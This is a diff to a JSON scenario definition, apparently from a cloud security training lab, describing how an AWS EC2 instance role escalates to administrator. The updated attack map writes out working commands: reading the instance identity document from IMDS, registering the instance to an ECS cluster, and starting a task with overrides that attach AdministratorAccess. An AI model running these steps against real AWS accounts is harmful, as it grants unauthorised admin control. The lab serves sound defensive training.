@@ -1,5 +1,5 @@
 {
-  "displayName": "Privilege Escalation via iam:PassRole + ecs:StartTask + ecs:RegisterContainerInstance",
+  "displayName": "ECS Container Instance Registration + Start Task to Admin",
   "name": "ecs-007-iam-passrole+ecs-starttask+ecs-registercontainerinstance",
   "description": "Registering an unregistered EC2 instance to an ECS cluster via SSM, then using ecs:StartTask with --overrides to launch an existing task definition with an admin role and malicious command",
   "costEstimate": "$8/mo",
@@ -31,26 +31,30 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/ecs-007-iam-passrole+ecs-starttask+ecs-registercontainerinstance"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/ecs-007-iam-passrole+ecs-starttask+ecs-registercontainerinstance",
-  "schemaVersion": "3.0.0",
+  "schemaVersion": "4.0.0",
   "permissions": {
     "required": [
       {
         "permission": "ecs:RegisterContainerInstance",
+        "principal": "pl-prod-ecs-007-to-admin-instance-role",
         "resource": "*",
         "description": "register the EC2 instance to the target ECS cluster via direct API call using IMDS identity documents"
       },
       {
         "permission": "ecs:StartTask",
+        "principal": "pl-prod-ecs-007-to-admin-instance-role",
         "resource": "*",
         "description": "start a task on the registered container instance with --overrides to override taskRoleArn and container command"
       },
       {
         "permission": "iam:PassRole",
+        "principal": "pl-prod-ecs-007-to-admin-instance-role",
         "resource": "arn:aws:iam::*:role/pl-prod-ecs-007-to-admin-target-role, arn:aws:iam::*:role/pl-prod-ecs-007-to-admin-execution-role",
         "description": "pass the admin target role as the task role override in ecs:StartTask"
       },
       {
         "permission": "ecs:DeregisterContainerInstance",
+        "principal": "pl-prod-ecs-007-to-admin-instance-role",
         "resource": "*",
         "description": "deregister the container instance from the cluster (cleanup)"
       }
@@ -58,14 +62,17 @@
     "helpful": [
       {
         "permission": "ecs:ListContainerInstances",
+        "principal": "pl-prod-ecs-007-to-admin-instance-role",
         "purpose": "verify container instance registered and retrieve its ARN"
       },
       {
         "permission": "ecs:ListTaskDefinitions",
+        "principal": "pl-prod-ecs-007-to-admin-instance-role",
         "purpose": "discover existing task definitions to exploit"
       },
       {
         "permission": "ecs:DescribeTasks",
+        "principal": "pl-prod-ecs-007-to-admin-instance-role",
         "purpose": "monitor task execution status and verify task completion"
       }
     ]
@@ -74,14 +81,14 @@
     "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-ecs-007-to-admin-instance-role` EC2 instance role to the `pl-prod-ecs-007-to-admin-target-role` administrative role by registering an unregistered EC2 instance to an ECS cluster via `ecs:RegisterContainerInstance` and then launching an existing task definition with an overridden `taskRoleArn` and command via `ecs:StartTask --overrides`.\n\n- **Start:** `arn:aws:iam::{account_id}:role/pl-prod-ecs-007-to-admin-instance-role`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-ecs-007-to-admin-target-role`",
     "setup": {
       "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
-      "deployNonInteractive": "```bash\nplabs enable enable_single_account_privesc_one_hop_to_admin_ecs_007_iam_passrole_ecs_starttask_ecs_registercontainerinstance\nplabs apply\n```",
+      "deployNonInteractive": "```bash\nplabs enable single_account_privesc_one_hop_to_admin_ecs_007_iam_passrole_ecs_starttask_ecs_registercontainerinstance\nplabs apply\n```",
       "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to enable it\n4. Press `d` to deploy"
     },
     "attack": {
       "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::PROD_ACCOUNT:user/pl-prod-ecs-007-to-admin-starting-user` | Scenario-specific starting user with access keys, iam:PassRole, ecs:StartTask, and ssm:SendCommand permissions |\n| `arn:aws:iam::PROD_ACCOUNT:role/pl-prod-ecs-007-to-admin-target-role` | Admin role with AdministratorAccess that can be passed to ECS tasks (trusts ecs-tasks.amazonaws.com) |\n| `arn:aws:iam::PROD_ACCOUNT:role/pl-prod-ecs-007-to-admin-execution-role` | Task execution role for pulling container images and writing logs |\n| `arn:aws:iam::PROD_ACCOUNT:role/pl-prod-ecs-007-to-admin-instance-role` | EC2 instance role with AmazonEC2ContainerServiceforEC2Role and AmazonSSMManagedInstanceCore policies |\n| `arn:aws:ecs:REGION:PROD_ACCOUNT:cluster/pl-prod-ecs-007-cluster` | ECS cluster (starts empty with no registered container instances) |\n| `arn:aws:ecs:REGION:PROD_ACCOUNT:task-definition/pl-prod-ecs-007-existing-task` | Pre-existing benign task definition that gets overridden at runtime |\n| `arn:aws:ec2:REGION:PROD_ACCOUNT:instance/INSTANCE_ID` | ECS-optimized EC2 instance with ECS agent installed (NOT registered to any cluster until the demo runs) |",
       "demoAttack": {
         "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Verify successful privilege escalation\n4. Output standardized test results for automation",
-        "resourcesCreated": "- AdministratorAccess policy attached to `pl-prod-ecs-007-to-admin-starting-user`\n- ECS container instance registration for the EC2 instance in `pl-prod-ecs-007-cluster`\n- ECS task launched on the container instance via `ecs:StartTask` with overrides",
+        "resourcesCreated": "- AdministratorAccess policy attached to `pl-prod-ecs-007-to-admin-instance-role`\n- ECS container instance registration for the EC2 instance in `pl-prod-ecs-007-cluster`\n- ECS task launched on the container instance via `ecs:StartTask` with overrides",
         "nonInteractive": "```bash\nplabs demo --list\nplabs demo ecs-007-iam-passrole+ecs-starttask+ecs-registercontainerinstance\n```",
         "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `r` to run the demo script"
       },
@@ -91,7 +98,7 @@
       }
     },
     "teardown": {
-      "nonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_admin_ecs_007_iam_passrole_ecs_starttask_ecs_registercontainerinstance\nplabs apply\n```",
+      "nonInteractive": "```bash\nplabs disable single_account_privesc_one_hop_to_admin_ecs_007_iam_passrole_ecs_starttask_ecs_registercontainerinstance\nplabs apply\n```",
       "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
     },
     "defend": {
@@ -109,28 +116,20 @@
   "attackMap": {
     "nodes": [
       {
-        "id": "starting-user",
-        "label": "Starting User",
+        "id": "starting-principal",
+        "label": "Instance Role",
         "type": "principal",
-        "subType": "iam-user",
-        "arn": "arn:aws:iam::{account_id}:user/pl-prod-ecs-007-to-admin-starting-user",
-        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has iam:PassRole, ecs:StartTask, and ssm:SendCommand permissions, enabling registration of an unregistered EC2 instance to an ECS cluster and subsequent task launch with overridden role and command parameters.\n"
+        "subType": "iam-role",
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-ecs-007-to-admin-instance-role",
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This is the IAM role attached to an EC2 instance -- in practice, you have obtained Remote Code Execution (RCE) on that instance, giving you access to the role's temporary credentials via the Instance Metadata Service (IMDS). The role has ecs:RegisterContainerInstance, ecs:StartTask, iam:PassRole (to the admin target role and the execution role), and ecs:DeregisterContainerInstance permissions.\n"
       },
       {
         "id": "ec2-instance",
-        "label": "Unregistered EC2 Instance",
+        "label": "Unregistered EC2",
         "type": "resource",
         "subType": "ec2-instance",
         "arn": "arn:aws:ec2:{region}:{account_id}:instance/INSTANCE_ID",
-        "description": "An ECS-optimized EC2 instance with the ECS agent installed but not yet registered to any cluster. By sending an SSM command to overwrite the ECS agent configuration and restart it, you can cause this instance to call ecs:RegisterContainerInstance and join the target cluster under your direction.\n"
-      },
-      {
-        "id": "ecs-cluster",
-        "label": "ECS Cluster",
-        "type": "resource",
-        "subType": "ecs-task",
-        "arn": "arn:aws:ecs:{region}:{account_id}:cluster/pl-prod-ecs-007-cluster",
-        "description": "The target ECS cluster that starts empty with no registered container instances. Once the EC2 instance is reconfigured via SSM and the ECS agent restarts, it registers itself to this cluster, making it available as a placement target for ecs:StartTask.\n"
+        "description": "An ECS-optimized EC2 instance with the ECS agent installed but configured to point to a non-existent holding cluster, making it effectively unregistered. The attacker can register this instance directly to the target cluster by calling ecs:RegisterContainerInstance with the instance's cryptographically signed identity document retrieved from IMDS, then reconfigure the ECS agent to connect with full capability attributes needed for task placement.\n"
       },
       {
         "id": "target-role",
@@ -139,69 +138,79 @@
         "subType": "iam-role",
         "isTarget": true,
         "arn": "arn:aws:iam::{account_id}:role/pl-prod-ecs-007-to-admin-target-role",
-        "description": "This IAM role has AdministratorAccess and trusts ecs-tasks.amazonaws.com. By passing this role via the taskRoleArn override in ecs:StartTask and overriding the container command to attach AdministratorAccess to the starting user, the ECS task runs with full admin credentials and escalates your privileges.\n"
+        "description": "This IAM role has AdministratorAccess and trusts ecs-tasks.amazonaws.com. The attacker passes this role via the taskRoleArn override in ecs:StartTask, causing the ECS container to run with full administrative credentials. The container command is also overridden to attach AdministratorAccess to the instance role, completing the privilege escalation.\n"
       }
     ],
     "edges": [
       {
-        "from": "starting-user",
+        "from": "starting-principal",
         "to": "ec2-instance",
-        "label": "ssm:SendCommand",
-        "description": "Send an SSM command to the unregistered EC2 instance to overwrite the ECS agent configuration, setting ECS_CLUSTER to the target cluster, then restart the ECS agent.\n",
+        "label": "ecs:RegisterContainerInstance",
+        "description": "The attacker retrieves the instance identity document and its cryptographic signature from IMDS (169.254.169.254), then calls ecs:RegisterContainerInstance directly via the AWS API to register this EC2 instance into the target ECS cluster. The cluster was previously empty with no container instances. After registration, the ECS agent is reconfigured and restarted to connect to the cluster with full capability attributes required for task placement.\n",
         "hints": [
-          "You have permissions to send commands to EC2 instances.",
-          "An EC2 instance with the ECS agent is running but not assigned to any cluster \u2014 it can be redirected.",
-          "The ECS agent reads its cluster assignment from /etc/ecs/ecs.config at startup. Use ssm:SendCommand to overwrite ECS_CLUSTER and restart the agent."
+          "The ECS cluster exists but is empty -- there are no container instances registered. You cannot start tasks without a container instance to place them on.",
+          "Use ecs:ListContainerInstances to confirm the cluster state, and ecs:ListTaskDefinitions to discover what task definitions already exist that you might be able to exploit.",
+          "EC2 instances store a signed identity document at the IMDS endpoint (http://169.254.169.254/latest/dynamic/instance-identity/). This document can be used to authenticate the instance to ECS without going through the ECS agent.",
+          "The ecs:RegisterContainerInstance API accepts an instance identity document and signature as parameters -- this lets you register an EC2 instance to any cluster you choose, bypassing the ECS agent's cluster configuration.",
+          "After calling RegisterContainerInstance via the API, reconfigure the ECS agent (/etc/ecs/ecs.config) to point to the target cluster and restart it, so the agent connects with the full Docker and networking capability attributes needed for StartTask.",
+          "Browse to https://pathfinding.cloud/paths/ecs-007 for technique details and the original research at https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path"
         ],
         "commands": [
           {
-            "description": "Retrieve the EC2 instance ID from Terraform outputs",
-            "command": "INSTANCE_ID=$(terraform output -json | jq -r '.single_account_privesc_one_hop_to_admin_ecs_007_iam_passrole_ecs_starttask_ecs_registercontainerinstance.value.ec2_instance_id')"
+            "description": "Retrieve the instance identity document from IMDS",
+            "command": "IDENTITY_DOC=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/document)"
           },
           {
-            "description": "Send SSM command to reconfigure the ECS agent and restart it",
-            "command": "aws ssm send-command --instance-ids \"$INSTANCE_ID\" --document-name \"AWS-RunShellScript\" --parameters 'commands=[\"echo ECS_CLUSTER=pl-prod-ecs-007-cluster >> /etc/ecs/ecs.config\",\"systemctl restart ecs\"]'"
+            "description": "Retrieve the instance identity document signature from IMDS",
+            "command": "IDENTITY_SIG=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/signature | tr -d '\\n')"
+          },
+          {
+            "description": "Calculate instance resources for registration",
+            "command": "TOTAL_CPU=$(($(nproc --all) * 1024)); TOTAL_MEM=$(grep MemTotal /proc/meminfo | awk '{print int($2/1024)}')"
+          },
+          {
+            "description": "Register the EC2 instance to the target cluster via direct API call",
+            "command": "aws ecs register-container-instance --cluster pl-prod-ecs-007-cluster --instance-identity-document \"$IDENTITY_DOC\" --instance-identity-document-signature \"$IDENTITY_SIG\" --total-resources '[{\"name\":\"CPU\",\"type\":\"INTEGER\",\"integerValue\":$TOTAL_CPU},{\"name\":\"MEMORY\",\"type\":\"INTEGER\",\"integerValue\":$TOTAL_MEM}]' --query 'containerInstance.containerInstanceArn' --output text"
+          },
+          {
+            "description": "Reconfigure the ECS agent to point to the target cluster and restart it",
+            "command": "sed -i 's/pl-prod-ecs-007-holding/pl-prod-ecs-007-cluster/' /etc/ecs/ecs.config && systemctl restart ecs"
           }
         ]
       },
       {
         "from": "ec2-instance",
-        "to": "ecs-cluster",
-        "label": "ecs:RegisterContainerInstance",
-        "description": "The restarted ECS agent automatically calls ecs:RegisterContainerInstance using the instance's IAM role credentials, adding the EC2 instance to the target cluster as an available container instance.\n",
-        "hints": [
-          "The cluster is empty. You need a container instance before you can start tasks.",
-          "After the ECS agent restarts, use ecs:ListContainerInstances to confirm the instance appeared in the cluster."
-        ],
-        "commands": [
-          {
-            "description": "Wait for the instance to register, then list container instances",
-            "command": "aws ecs list-container-instances --cluster pl-prod-ecs-007-cluster"
-          }
-        ]
-      },
-      {
-        "from": "starting-user",
         "to": "target-role",
         "label": "ecs:StartTask + iam:PassRole",
-        "description": "Use ecs:StartTask with --overrides to launch the existing task definition on the newly-registered container instance. Override taskRoleArn to specify the admin role and override the container command to attach AdministratorAccess to the starting user.\n",
+        "description": "With a container instance now registered in the cluster, call ecs:StartTask targeting the pre-existing task definition. Use the --overrides parameter to substitute two things at runtime: the taskRoleArn (set to the admin target role via iam:PassRole) and the container command (set to attach AdministratorAccess to the instance role). The ECS task runs with full admin credentials and completes the privilege escalation.\n",
         "hints": [
-          "You can start ECS tasks and pass roles. Look for a task definition you can exploit.",
-          "ecs:StartTask accepts an --overrides parameter that lets you substitute the task role and override container commands at launch time.",
-          "Browse to https://pathfinding.cloud/paths/ecs-007 for technique details."
+          "Now that a container instance is registered, you can start tasks. Check which task definitions already exist -- you do not need to create a new one.",
+          "ecs:StartTask (unlike ecs:RunTask) requires you to specify a container instance ARN. Use ecs:ListContainerInstances to get the ARN of the instance you just registered.",
+          "The --overrides parameter in ecs:StartTask lets you change the task role and override container commands at launch time, without modifying the task definition itself.",
+          "Set taskRoleArn in the overrides to the admin role ARN -- this is the iam:PassRole action. The container will run with those admin credentials.",
+          "Override the container command to run an IAM API call that grants your instance role administrative access. The container has admin credentials via the task role; use them to modify the instance role's attached policies.",
+          "Browse to https://pathfinding.cloud/paths/ecs-007 for the full technique walkthrough."
         ],
         "commands": [
           {
-            "description": "Retrieve the container instance ARN",
+            "description": "Find the container instance ARN registered to the cluster",
             "command": "CONTAINER_INSTANCE_ARN=$(aws ecs list-container-instances --cluster pl-prod-ecs-007-cluster --query 'containerInstanceArns[0]' --output text)"
           },
           {
-            "description": "Start the task with role and command overrides",
-            "command": "aws ecs start-task --cluster pl-prod-ecs-007-cluster --task-definition pl-prod-ecs-007-existing-task --container-instances \"$CONTAINER_INSTANCE_ARN\" --overrides '{\"taskRoleArn\":\"arn:aws:iam::{account_id}:role/pl-prod-ecs-007-to-admin-target-role\",\"containerOverrides\":[{\"name\":\"existing-container\",\"command\":[\"aws\",\"iam\",\"attach-user-policy\",\"--user-name\",\"pl-prod-ecs-007-to-admin-starting-user\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}]}'"
+            "description": "Build the overrides JSON -- override the task role to the admin role and the command to attach AdministratorAccess to the instance role",
+            "command": "OVERRIDES='{\"taskRoleArn\":\"arn:aws:iam::{account_id}:role/pl-prod-ecs-007-to-admin-target-role\",\"containerOverrides\":[{\"name\":\"pl-prod-ecs-007-benign-container\",\"command\":[\"iam\",\"attach-role-policy\",\"--role-name\",\"pl-prod-ecs-007-to-admin-instance-role\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}]}'"
           },
           {
-            "description": "Verify administrator access",
-            "command": "aws iam list-users --max-items 1"
+            "description": "Start the task with the overrides applied",
+            "command": "aws ecs start-task --cluster pl-prod-ecs-007-cluster --task-definition pl-prod-ecs-007-existing-task --container-instances \"$CONTAINER_INSTANCE_ARN\" --overrides \"$OVERRIDES\" --query 'tasks[0].taskArn' --output text"
+          },
+          {
+            "description": "Monitor task status until STOPPED",
+            "command": "aws ecs describe-tasks --cluster pl-prod-ecs-007-cluster --tasks \"$TASK_ARN\" --query 'tasks[0].{status:lastStatus,exitCode:containers[0].exitCode}'"
+          },
+          {
+            "description": "Verify administrator access after IAM propagation",
+            "command": "aws iam list-users --max-items 3"
           }
         ]
       }
